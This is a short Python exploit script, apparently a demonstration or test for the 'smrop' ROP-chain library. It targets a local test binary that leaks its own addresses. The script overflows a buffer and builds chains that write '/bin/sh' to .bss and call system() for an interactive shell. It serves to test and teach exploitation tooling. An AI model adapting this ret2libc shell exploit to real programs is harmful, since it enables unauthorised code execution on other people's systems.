from pwn import *
import smrop

print("Executing simple")
r = process("./test/simple")

print("Loading ELF files")
bin = ELF("./test/simple")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

print("Performing ROP analysis")
sm = smrop.Smrop(binary=bin, libc=libc)

print("Building payload")
# calls to ret ensure that the stack
# is properly 16 byte aligned
payload = (sm.prefix(b"A"*24)
            .pop_rdi(binary=bin.bss()) # will search for appropriate ROP 
            .ret("gets")
            .ret("main"))

# program returns location of main and gets
print("Reading offsets provided by program")
binary_location = int(r.recvline(),16) - bin.symbols["main"]
libc_location = int(r.recvline(),16) - libc.symbols["gets"]
print("Received binary_location: {} libc_location: {}".format(binary_location, libc_location))
# throws an exception if ROP cannot be easily satisfied.
payload_bytes = payload.resolve(binary=binary_location, libc=libc_location)
r.sendline(payload_bytes)

# write /bin/sh to bss section
r.sendline("/bin/sh")

# do system
payload2 = (sm.prefix(b"A"*24)
            .pop_rdi(binary=bin.bss())
            .nop()
            .ret("system"))
r.sendline(payload2.resolve(binary=binary_location, libc=libc_location))
r.interactive()
